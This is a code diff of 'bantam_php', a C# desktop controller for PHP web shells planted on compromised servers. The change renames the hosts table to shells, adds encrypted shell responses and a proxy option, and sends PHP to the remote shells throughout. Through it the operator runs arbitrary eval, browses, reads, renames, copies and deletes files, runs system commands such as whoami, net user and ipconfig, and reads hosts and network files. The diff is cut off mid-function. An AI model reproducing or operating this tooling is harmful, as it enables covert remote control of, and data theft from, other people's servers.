@@ -5,6 +5,7 @@ using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -27,7 +28,7 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        public static Dictionary<String, ShellInfo> Hosts = new Dictionary<String, ShellInfo>();
+        public static Dictionary<String, ShellInfo> Shells = new Dictionary<String, ShellInfo>();
 
         /// <summary>
         /// Static Forms
@@ -60,8 +61,8 @@ namespace bantam_php
             }
 
             if (string.IsNullOrEmpty(shellUrl) == false
-             && Hosts.ContainsKey(shellUrl)
-             && Hosts[shellUrl].Down == false) {
+             && Shells.ContainsKey(shellUrl)
+             && Shells[shellUrl].down == false) {
                 return true;
             }
             return false;
@@ -82,7 +83,7 @@ namespace bantam_php
                 int lastIndex = listViewClients.Items.Count - 1;
                 listViewClients.Items[lastIndex].BackColor = System.Drawing.Color.Red;
 
-                Hosts[shellUrl].Down = true;
+                Shells[shellUrl].down = true;
             }
         }
 
@@ -103,12 +104,16 @@ namespace bantam_php
         /// </summary>
         /// <param name="phpCode"></param>
         /// <param name="title"></param>
-        public async void executePHPCodeDisplayInRichTextBox(string phpCode, string title)
+        public async void executePHPCodeDisplayInRichTextBox(string phpCode, string title, bool encryptResponse)
         {
-            string result = await Task.Run(() => WebHelper.WebRequest(g_SelectedShellUrl, phpCode));
+            string result = await Task.Run(() => WebHelper.ExecuteRemotePHP(g_SelectedShellUrl, phpCode));
 
             if (string.IsNullOrEmpty(result) == false) {
-                GuiHelper.RichTextBoxDialog(title, result);
+                
+                //todo encryption
+                string s = EncryptionHelper.DecryptShellResponse(result);
+
+                GuiHelper.RichTextBoxDialog(title, s);
             } else {
                 MessageBox.Show("No Data Returned", "Welp...");
             }
@@ -124,7 +129,8 @@ namespace bantam_php
                 Stopwatch pingWatch = new Stopwatch();
                 pingWatch.Start();
 
-                string result = await WebHelper.WebRequest(shellUrl, PhpHelper.initDataVars);
+                //todo encryption
+                string result = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.initDataVars);
 
                 if (string.IsNullOrEmpty(result) == false) {
                     string[] data = { null };
@@ -134,7 +140,7 @@ namespace bantam_php
 
                     if (data != null && data.Length == (int)initDataReturnedVarCount + 1) {
                         addClientMethod(shellUrl, pingWatch.ElapsedMilliseconds.ToString());
-                        Hosts[shellUrl].update(pingWatch.ElapsedMilliseconds, data);
+                        Shells[shellUrl].update(pingWatch.ElapsedMilliseconds, data);
                     } else {
                         addClientMethod(shellUrl, "-");
                     }
@@ -176,13 +182,14 @@ namespace bantam_php
             }
 
             bool checkBoxChecked = true;
+            bool encryptResponse = Shells[g_SelectedShellUrl].encryptResponse;
             string code = GuiHelper.RichTextBoxEvalEditor("PHP Eval Editor - " + g_SelectedShellUrl, "", ref checkBoxChecked);
 
             if (string.IsNullOrEmpty(code) == false) {
                 if (checkBoxChecked) {
-                    executePHPCodeDisplayInRichTextBox(code, "PHP Eval Result - " + g_SelectedShellUrl);
+                    executePHPCodeDisplayInRichTextBox(code, "PHP Eval Result - " + g_SelectedShellUrl, encryptResponse);
                 } else {
-                    string result = await WebHelper.WebRequest(g_SelectedShellUrl, code);
+                    await WebHelper.ExecuteRemotePHP(g_SelectedShellUrl, code);
                 }
             }
         }
@@ -202,15 +209,16 @@ namespace bantam_php
             ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewClients);
 
             if (lvi != null
-            && (Hosts[shellUrl].PingStopwatch == null || Hosts[shellUrl].PingStopwatch.IsRunning == false)) {
+            && (Shells[shellUrl].pingStopwatch == null || Shells[shellUrl].pingStopwatch.IsRunning == false)) {
 
-                Hosts[shellUrl].PingStopwatch = new Stopwatch();
-                Hosts[shellUrl].PingStopwatch.Start();
+                Shells[shellUrl].pingStopwatch = new Stopwatch();
+                Shells[shellUrl].pingStopwatch.Start();
 
-                string result = await WebHelper.WebRequest(shellUrl, PhpHelper.phpTestExecutionWithEcho);
+                //todo encryption
+                string result = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.phpTestExecutionWithEcho);
 
-                lvi.SubItems[1].Text = Hosts[shellUrl].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
-                Hosts[shellUrl].PingStopwatch.Stop();
+                lvi.SubItems[1].Text = Shells[shellUrl].pingStopwatch.ElapsedMilliseconds.ToString() + " ms";
+                Shells[shellUrl].pingStopwatch.Stop();
 
             }
         }
@@ -226,7 +234,8 @@ namespace bantam_php
                 return;
             }
 
-            string result = await WebHelper.WebRequest(g_SelectedShellUrl, PhpHelper.phpInfo);
+            //todo encryption
+            string result = await WebHelper.ExecuteRemotePHP(g_SelectedShellUrl, PhpHelper.phpInfo);
 
             if (string.IsNullOrEmpty(result) == false) {
                 BrowserView broView = new BrowserView(result, 1000, 1000);
@@ -257,19 +266,19 @@ namespace bantam_php
                 if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0) {
                     //Clear previously cached treeview to only store 1 copy
                     if (!string.IsNullOrEmpty(g_SelectedShellUrl)
-                    && Hosts[g_SelectedShellUrl].Files.Nodes.Count > 0) {
-                        Hosts[g_SelectedShellUrl].Files.Nodes.Clear();
+                    && Shells[g_SelectedShellUrl].files.Nodes.Count > 0) {
+                        Shells[g_SelectedShellUrl].files.Nodes.Clear();
                     }
                     //store current treeview into client and clear
-                    GuiHelper.CopyNodesFromTreeView(treeViewFileBrowser, Hosts[g_SelectedShellUrl].Files);
+                    GuiHelper.CopyNodesFromTreeView(treeViewFileBrowser, Shells[g_SelectedShellUrl].files);
                     treeViewFileBrowser.Nodes.Clear();
                 }
 
                 if (!string.IsNullOrEmpty(g_SelectedShellUrl)
-                 && Hosts.ContainsKey(g_SelectedShellUrl)
-                 && !string.IsNullOrEmpty(Hosts[g_SelectedShellUrl].PWD)
+                 && Shells.ContainsKey(g_SelectedShellUrl)
+                 && !string.IsNullOrEmpty(Shells[g_SelectedShellUrl].pwd)
                  && !string.IsNullOrEmpty(txtBoxFileBrowserPath.Text)) {
-                    Hosts[g_SelectedShellUrl].PWD = txtBoxFileBrowserPath.Text;
+                    Shells[g_SelectedShellUrl].pwd = txtBoxFileBrowserPath.Text;
                     //MessageBox.Show(Hosts[g_SelectedTarget].PWD);
                 }
 
@@ -301,29 +310,29 @@ namespace bantam_php
                     txtBoxFileBrowserPath.Text = "";
                     return;
                 } else {
-                    lblDynCWD.Text = Hosts[g_SelectedShellUrl].CWD;
-                    lblDynFreeSpace.Text = string.IsNullOrEmpty(Hosts[g_SelectedShellUrl].FreeHDDSpace) ? "0"
-                                         : GuiHelper.FormatBytes(Convert.ToDouble(Hosts[g_SelectedShellUrl].FreeHDDSpace));
+                    lblDynCWD.Text = Shells[g_SelectedShellUrl].cwd;
+                    lblDynFreeSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].freeHDDSpace) ? "0"
+                                         : GuiHelper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].freeHDDSpace));
 
-                    lblDynHDDSpace.Text = string.IsNullOrEmpty(Hosts[g_SelectedShellUrl].TotalHDDSpace) ? "0"
-                                        : GuiHelper.FormatBytes(Convert.ToDouble(Hosts[g_SelectedShellUrl].TotalHDDSpace));
+                    lblDynHDDSpace.Text = string.IsNullOrEmpty(Shells[g_SelectedShellUrl].totalHDDSpace) ? "0"
+                                        : GuiHelper.FormatBytes(Convert.ToDouble(Shells[g_SelectedShellUrl].totalHDDSpace));
 
-                    lblDynServerIP.Text = Hosts[g_SelectedShellUrl].IP;
-                    lblDynUname.Text = Hosts[g_SelectedShellUrl].UnameRelease + " " + Hosts[g_SelectedShellUrl].UnameKernel;
-                    lblDynUser.Text = Hosts[g_SelectedShellUrl].UID + " ( " + Hosts[g_SelectedShellUrl].User + " )";
-                    lblDynWebServer.Text = Hosts[g_SelectedShellUrl].ServerSoftware;
-                    lblDynGroup.Text = Hosts[g_SelectedShellUrl].GID + " ( " + Hosts[g_SelectedShellUrl].Group + " )";
-                    lblDynPHP.Text = Hosts[g_SelectedShellUrl].PHP_Version;
+                    lblDynServerIP.Text = Shells[g_SelectedShellUrl].ip;
+                    lblDynUname.Text = Shells[g_SelectedShellUrl].unameRelease + " " + Shells[g_SelectedShellUrl].unameKernel;
+                    lblDynUser.Text = Shells[g_SelectedShellUrl].uid + " ( " + Shells[g_SelectedShellUrl].user + " )";
+                    lblDynWebServer.Text = Shells[g_SelectedShellUrl].serverSoftware;
+                    lblDynGroup.Text = Shells[g_SelectedShellUrl].gid + " ( " + Shells[g_SelectedShellUrl].group + " )";
+                    lblDynPHP.Text = Shells[g_SelectedShellUrl].PHP_Version;
                 }
 
                 if (tabControl1.SelectedTab == tabPageFiles) {
-                    if (Hosts[g_SelectedShellUrl].Files.Nodes != null
-                     && Hosts[g_SelectedShellUrl].Files.Nodes.Count > 0) {
-                        GuiHelper.CopyNodesFromTreeView(Hosts[g_SelectedShellUrl].Files, treeViewFileBrowser);
+                    if (Shells[g_SelectedShellUrl].files.Nodes != null
+                     && Shells[g_SelectedShellUrl].files.Nodes.Count > 0) {
+                        GuiHelper.CopyNodesFromTreeView(Shells[g_SelectedShellUrl].files, treeViewFileBrowser);
                         treeViewFileBrowser.Refresh();
                         treeViewFileBrowser.ExpandAll();
 
-                        txtBoxFileBrowserPath.Text = Hosts[g_SelectedShellUrl].PWD;
+                        txtBoxFileBrowserPath.Text = Shells[g_SelectedShellUrl].pwd;
                     } else {
                         start_FileBrowser();
                     }
@@ -346,14 +355,14 @@ namespace bantam_php
             if (tabControl1.SelectedTab == tabPageFiles) {
                 //if the gui's treeview is empty and the cached treeview data is not empty
                 if (treeViewFileBrowser.Nodes.Count == 0
-                && Hosts[shellUrl].Files.Nodes != null
-                && Hosts[shellUrl].Files.Nodes.Count > 0) {
+                && Shells[shellUrl].files.Nodes != null
+                && Shells[shellUrl].files.Nodes.Count > 0) {
                     //populate the treeview from cache
-                    GuiHelper.CopyNodesFromTreeView(Hosts[shellUrl].Files, treeViewFileBrowser);
+                    GuiHelper.CopyNodesFromTreeView(Shells[shellUrl].files, treeViewFileBrowser);
                     treeViewFileBrowser.Refresh();
                     treeViewFileBrowser.ExpandAll();
 
-                    txtBoxFileBrowserPath.Text = Hosts[shellUrl].PWD;
+                    txtBoxFileBrowserPath.Text = Shells[shellUrl].pwd;
                 } else {
                     //if the gui treeview is empty, start the filebrowser and display it
                     if (treeViewFileBrowser.Nodes.Count == 0) {
@@ -393,7 +402,7 @@ namespace bantam_php
                 systemToolstripMenuItem.Visible = true;
                 softwareToolStripMenuItem.Visible = true;
 
-                if (Hosts[g_SelectedShellUrl].isWindows) {
+                if (Shells[g_SelectedShellUrl].isWindows) {
                     linuxToolStripMenuItem.Visible = false;
                     windowsToolStripMenuItem.Visible = true;
                 } else {
@@ -412,27 +421,27 @@ namespace bantam_php
 
             if (string.IsNullOrEmpty(g_SelectedShellUrl) == false) {
                 listViewClients.SelectedItems[0].Remove();
-                Hosts.Remove(g_SelectedShellUrl);
+                Shells.Remove(g_SelectedShellUrl);
             }
         }
 
         private async void pingToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             if (string.IsNullOrEmpty(g_SelectedShellUrl)
-             || Hosts.ContainsKey(g_SelectedShellUrl) == false) {
+             || Shells.ContainsKey(g_SelectedShellUrl) == false) {
                 return;
             }
 
             string shellURL = g_SelectedShellUrl;
-            string requestArgName = Hosts[shellURL].RequestArgName;
-            bool sendViaCookie = Hosts[shellURL].SendDataViaCookie;
+            string requestArgName = Shells[shellURL].requestArgName;
+            bool sendViaCookie = Shells[shellURL].sendDataViaCookie;
 
             listViewClients.FindItemWithText(shellURL).Remove();
-            Hosts.Remove(shellURL);
+            Shells.Remove(shellURL);
 
-            Hosts.Add(shellURL, new ShellInfo());
-            Hosts[shellURL].RequestArgName = requestArgName;
-            Hosts[shellURL].SendDataViaCookie = sendViaCookie;
+            Shells.Add(shellURL, new ShellInfo());
+            Shells[shellURL].requestArgName = requestArgName;
+            Shells[shellURL].sendDataViaCookie = sendViaCookie;
 
             getInitDataThread(shellURL);
         }
@@ -467,7 +476,7 @@ namespace bantam_php
 
             if (openShellXMLDialog.ShowDialog() == DialogResult.OK) {
                 foreach (ListViewItem lvClients in listViewClients.Items) {
-                    Hosts.Remove(lvClients.Text);
+                    Shells.Remove(lvClients.Text);
                     lvClients.Remove();
                 }
                 XmlHelper.loadShells(openShellXMLDialog.FileName);
@@ -480,8 +489,8 @@ namespace bantam_php
         {
             if (string.IsNullOrEmpty(g_SelectedShellUrl) == false) {
                 string shellUrl = g_SelectedShellUrl;
-                string varName = Hosts[shellUrl].RequestArgName;
-                string varType = (Hosts[shellUrl].SendDataViaCookie ? "cookie" : "post");
+                string varName = Shells[shellUrl].requestArgName;
+                string varType = (Shells[shellUrl].sendDataViaCookie ? "cookie" : "post");
 
                 updateHostForm = new AddHost(shellUrl, varName, varType);
                 updateHostForm.Show();
@@ -516,22 +525,21 @@ namespace bantam_php
             }
 
             string shellUrl = g_SelectedShellUrl;
-            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, Hosts[shellUrl].PHP_Version);
+            string phpVersion = Shells[shellUrl].PHP_Version;
+            bool encryptResponse = Shells[shellUrl].encryptResponse;
 
-            string result = await WebHelper.WebRequest(shellUrl, directoryContentsPHPCode);
+            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, phpVersion, encryptResponse);
+            string result = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);
 
             if (string.IsNullOrEmpty(shellUrl) == false) {
                 //Clear preview treeview data
-                Hosts[shellUrl].Files.Nodes.Clear();
+                Shells[shellUrl].files.Nodes.Clear();
 
                 //if user didn't switch targets by the time this callback is triggered clear the live treeview
                 if (g_SelectedShellUrl == shellUrl) {
                     treeViewFileBrowser.Nodes.Clear();
                     treeViewFileBrowser.Refresh();
                 }
-
-                //patch
-                txtBoxFileBrowserPath.Text = result;
 
                 //set path
                 string path = txtBoxFileBrowserPath?.Text;
@@ -540,7 +548,10 @@ namespace bantam_php
                 }
 
                 if (result != null && result.Length > 0) {
-                    FileBrowserGo(result, shellUrl);
+                    if (encryptResponse) {
+                        result = EncryptionHelper.DecryptShellResponse(result);
+                    }
+                    FileBrowserRender(result, shellUrl);
                 }
             }
         }
@@ -550,7 +561,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="result"></param>
         /// <param name="shellUrl"></param>
-        private async void FileBrowserGo(string result, string shellUrl)
+        private async void FileBrowserRender(string result, string shellUrl)
         {
             string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);
 
@@ -570,7 +581,7 @@ namespace bantam_php
                                 }
                             } else {
                                 //the user changed "shellUrl/targets" before the call back so we add it into their client cache instead of the live treeview
-                                TreeNode lastTn = Hosts[shellUrl].Files.Nodes.Add("", columns[0], 0);
+                                TreeNode lastTn = Shells[shellUrl].files.Nodes.Add("", columns[0], 0);
                                 lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                 if (string.IsNullOrEmpty(columns[2]) == false) {
@@ -588,7 +599,7 @@ namespace bantam_php
                                 }
                             } else {
                                 //the user changed "shellUrl/targets" before the call back so we add it into their client cache instead of the live treeview
-                                TreeNode lastTn = Hosts[shellUrl].Files.Nodes.Add("", columns[0], 6);
+                                TreeNode lastTn = Shells[shellUrl].files.Nodes.Add("", columns[0], 6);
                                 lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);
 
                                 if (string.IsNullOrEmpty(columns[2]) == false) {
@@ -611,12 +622,13 @@ namespace bantam_php
             }
 
             string shellUrl = g_SelectedShellUrl;
-            txtBoxFileBrowserPath.Text = Hosts[g_SelectedShellUrl].CWD;
+            txtBoxFileBrowserPath.Text = Shells[g_SelectedShellUrl].cwd;
 
-            if (Hosts[shellUrl].isWindows) {
+            if (Shells[shellUrl].isWindows) {
                 txtBoxFileBrowserPath.Text = "";
 
-                string result = await WebHelper.WebRequest(shellUrl, PhpHelper.getHardDriveLetters);
+                //todo encryption
+                string result = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.getHardDriveLetters);
 
                 if (string.IsNullOrEmpty(result) == false) {
                     string[] drives = { null };
@@ -630,11 +642,18 @@ namespace bantam_php
                     }
                 }
             } else {
-                string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(".", Hosts[shellUrl].PHP_Version);
-                string result = await WebHelper.WebRequest(shellUrl, directoryContentsPHPCode);
+                string phpVersion = Shells[shellUrl].PHP_Version;
+                bool encryptResponse = Shells[shellUrl].encryptResponse;
+
+                string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(".", phpVersion, encryptResponse);
+                string result = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);
 
                 if (result != null && result.Length > 0) {
-                    FileBrowserGo(result, shellUrl);
+                    if(encryptResponse) {
+                        result = EncryptionHelper.DecryptShellResponse(result);
+                    }
+                    
+                    FileBrowserRender(result, shellUrl);
                 }
             }
 
@@ -670,14 +689,14 @@ namespace bantam_php
                 lastPathRemoved = "/";
             }
 
-            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(lastPathRemoved, Hosts[shellUrl].PHP_Version);
-            string result = await WebHelper.WebRequest(shellUrl, directoryContentsPHPCode);
+            bool encryptResponse = Shells[shellUrl].encryptResponse;
+            string phpVersion = Shells[shellUrl].PHP_Version;
+            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(lastPathRemoved, phpVersion, encryptResponse);
+            string result = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);
 
             if (string.IsNullOrEmpty(shellUrl) == false) {
-                //Clear preview treeview data
-                Hosts[shellUrl].Files.Nodes.Clear();
+                Shells[shellUrl].files.Nodes.Clear();
 
-                //if user didn't switch targets by the time this callback is triggered clear the live treeview
                 if (g_SelectedShellUrl == shellUrl) {
                     treeViewFileBrowser.Nodes.Clear();
                     treeViewFileBrowser.Refresh();
@@ -690,7 +709,10 @@ namespace bantam_php
                     }
 
                     if (result != null && result.Length > 0) {
-                        FileBrowserGo(result, shellUrl);
+                        if (encryptResponse) {
+                            result = EncryptionHelper.DecryptShellResponse(result);
+                        }
+                        FileBrowserRender(result, shellUrl);
                     }
                 }
             }
@@ -711,24 +733,27 @@ namespace bantam_php
             TreeNode tn = treeViewFileBrowser.SelectedNode;
 
             if (tn != null && tn.Nodes.Count == 0) {
-                //replace backslash from the treenode path to a proper forward slash
                 string path = tn.FullPath.Replace('\\', '/');
 
                 if (path.Contains("..")) {
                     filebrowserGoBack();
                 } else {
                     string fullPath = "";
-                    if (Hosts[shellUrl].isWindows) {
+                    if (Shells[shellUrl].isWindows) {
                         fullPath = path;
                     } else {
                         fullPath = txtBoxFileBrowserPath.Text + "/" + path;
                     }
 
-                    //Get Directory Contents PHP code
-                    string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(fullPath, Hosts[shellUrl].PHP_Version);
-                    string result = await WebHelper.WebRequest(shellUrl, directoryContentsPHPCode);
+                    string phpVersion = Shells[shellUrl].PHP_Version;
+                    bool encryptResponse = Shells[shellUrl].encryptResponse;
+                    string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(fullPath, phpVersion, encryptResponse);
+                    string result = await WebHelper.ExecuteRemotePHP(shellUrl, directoryContentsPHPCode);
 
                     if (string.IsNullOrEmpty(result) == false) {
+                        if (encryptResponse) {
+                            result = EncryptionHelper.DecryptShellResponse(result);
+                        }
                         string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);
 
                         if (rows.Length > 0 && rows != null) {
@@ -793,7 +818,7 @@ namespace bantam_php
 
             if (treeViewFileBrowser.Nodes != null
              && treeViewFileBrowser.Nodes.Count > 0) {
-                Hosts[g_SelectedShellUrl].Files.Nodes.Clear();
+                Shells[g_SelectedShellUrl].files.Nodes.Clear();
                 treeViewFileBrowser.Nodes.Clear();
                 treeViewFileBrowser.Refresh();
             }
@@ -827,10 +852,12 @@ namespace bantam_php
         /// <param name="e"></param>
         private void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
         {
+            string shellUrl = g_SelectedShellUrl;
             string name = fileBrowserGetFileName();
-            string phpCode = "@readfile('" + name + "');";
-
-            executePHPCodeDisplayInRichTextBox(phpCode, "Viewing File -" + name);
+            bool encrypt = Shells[g_SelectedShellUrl].encryptResponse;
+            string phpCode = PhpHelper.ReadFileProcedure(name, Shells[shellUrl].encryptResponse);
+        
+            executePHPCodeDisplayInRichTextBox(phpCode, "Viewing File -" + name, encrypt);
         }
 
         /// <summary>
@@ -852,7 +879,7 @@ namespace bantam_php
                 string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                 string phpCode = "@rename('" + fileName + "', '" + newFile + "');";
 
-                string result = await WebHelper.WebRequest(shellUrl, phpCode);
+                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
             }
         }
 
@@ -872,9 +899,8 @@ namespace bantam_php
             DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete \r\n(" + path + ")", "HOLD ON THERE COWBOY", MessageBoxButtons.YesNo);
 
             if (dialogResult == DialogResult.Yes) {
-                //todo abstract
                 string phpCode = "@unlink('" + path + "');";
-                string result = await WebHelper.WebRequest(shellUrl, phpCode);
+                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
             }
         }
 
@@ -895,8 +921,14 @@ namespace bantam_php
 
             if (newFileName != "") {
                 string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
-                string result = await WebHelper.WebRequest(shellUrl, phpCode);
+                await WebHelper.ExecuteRemotePHP(shellUrl, phpCode);
             }
+        }
+
+        private async void proxySettingsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            ProxyOptions proxyOptions = ProxyOptions.getInstance();
+            proxyOptions.ShowDialog();
         }
 
         #endregion
@@ -915,9 +947,12 @@ namespace bantam_php
             }
 
             string shellUrl = g_SelectedShellUrl;
-            bool isWin = Hosts[shellUrl].isWindows;
-            string phpCode = PhpHelper.executeSystemCode(PhpHelper.getTaskListFunction(isWin));
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.getTaskListFunction(isWin));
+            bool isWin = Shells[shellUrl].isWindows;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string cmd = PhpHelper.getTaskListFunction(isWin);
+            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
+
+            executePHPCodeDisplayInRichTextBox(phpCode, cmd, encrypt);
         }
        
         /// <summary>
@@ -927,8 +962,12 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void windowsNetuserMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_NetUser);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.windowsOS_NetUser);
+            string shellUrl = g_SelectedShellUrl;
+            string cmd = PhpHelper.windowsOS_NetUser;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
+
+            executePHPCodeDisplayInRichTextBox(phpCode, cmd, encrypt);
         }
 
         /// <summary>
@@ -938,8 +977,12 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void windowsNetaccountsMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_NetAccounts);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.windowsOS_NetAccounts);
+            string shellUrl = g_SelectedShellUrl;
+            string cmd = PhpHelper.windowsOS_NetAccounts;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
+
+            executePHPCodeDisplayInRichTextBox(phpCode, cmd, encrypt);
         }
 
         /// <summary>
@@ -949,8 +992,12 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void windowsIpconfigMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_Ipconfig);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.windowsOS_Ipconfig);
+            string shellUrl = g_SelectedShellUrl;
+            string cmd = PhpHelper.windowsOS_Ipconfig;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
+
+            executePHPCodeDisplayInRichTextBox(phpCode, cmd, encrypt);
         }
 
         /// <summary>
@@ -960,8 +1007,12 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void windowsVerToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_Ver);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.windowsOS_Ver);
+            string shellUrl = g_SelectedShellUrl;
+            string cmd = PhpHelper.windowsOS_Ver;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
+
+            executePHPCodeDisplayInRichTextBox(phpCode, cmd, encrypt);
         }
 
         /// <summary>
@@ -971,8 +1022,12 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.executeSystemCode(PhpHelper.posixOS_Whoami);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.posixOS_Whoami);
+            string shellUrl = g_SelectedShellUrl;
+            string cmd = PhpHelper.posixOS_Whoami;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
+
+            executePHPCodeDisplayInRichTextBox(phpCode, cmd, encrypt);
         }
 
         /// <summary>
@@ -982,8 +1037,12 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void linuxIfconfigMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.executeSystemCode(PhpHelper.linuxOS_Ifconfig);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxOS_Ifconfig);
+            string shellUrl = g_SelectedShellUrl;
+            string cmd = PhpHelper.linuxOS_Ifconfig;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ExecuteSystemCode(cmd, encrypt);
+
+            executePHPCodeDisplayInRichTextBox(phpCode, cmd, encrypt);
         }
 
         #endregion
@@ -996,8 +1055,11 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void windowsTargetsMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.readFileProcedure(PhpHelper.windowsFS_hostTargets);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.windowsFS_hostTargets);
+            string shellUrl = g_SelectedShellUrl;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.windowsFS_hostTargets, Shells[shellUrl].encryptResponse);
+
+            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.windowsFS_hostTargets, encrypt);
         }
 
         /// <summary>
@@ -1007,8 +1069,11 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void linuxInterfacesMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_NetworkInterfaces);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_NetworkInterfaces);
+            string shellUrl = g_SelectedShellUrl;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_NetworkInterfaces, Shells[shellUrl].encryptResponse);
+
+            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_NetworkInterfaces, encrypt);
         }
 
         /// <summary>
@@ -1018,8 +1083,10 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void linusVersionMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_ProcVersion);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_ProcVersion);
+            string shellUrl = g_SelectedShellUrl;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_ProcVersion, Shells[shellUrl].encryptResponse);
+            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_ProcVersion, encrypt);
         }
 
         /// <summary>
@@ -1029,8 +1096,10 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void linuxhostsMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_hostTargetsFile);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_hostTargetsFile);
+            string shellUrl = g_SelectedShellUrl;
+            bool encrypt = Shells[shellUrl].encryptResponse;
+            string phpCode = PhpHelper.ReadFileProcedure(PhpHelper.linuxFS_hostTargetsFile, Shells[shellUrl].encryptResponse);
+            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_hostTargetsFile, encrypt);
         }
 
         /// <summary>
@@ -1040,8 +1109,10 @@ namespace bantam_php
         /// <param name="e"></param>
         private async void linuxIssuenetMenuItem_Click(object sender, EventArgs e)
         {
-            string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_IssueFile);
-            executePHPCodeDisplayInRichTextBox(phpCode, PhpHelper.linuxFS_IssueFile);
+            string shellUrl = g_SelectedShellUrl;
